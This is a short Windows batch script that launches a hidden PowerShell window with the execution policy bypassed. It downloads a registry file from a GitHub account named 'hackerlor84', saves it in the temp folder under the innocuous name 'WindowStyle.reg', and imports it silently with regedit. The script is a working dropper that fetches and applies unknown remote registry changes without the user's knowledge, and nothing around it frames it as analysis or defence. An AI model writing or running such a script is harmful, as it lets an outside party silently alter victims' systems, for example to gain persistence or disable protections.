@echo off
set "URL=https://raw.githubusercontent.com/hackerlor84/hackerlor84/refs/heads/main/new2.reg"
set "SavePath=%TEMP%\WindowStyle.reg"

powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri %URL% -OutFile %SavePath%"

if exist %SavePath% (
    regedit.exe /s %SavePath%
) else (
    echo no.
)

pause
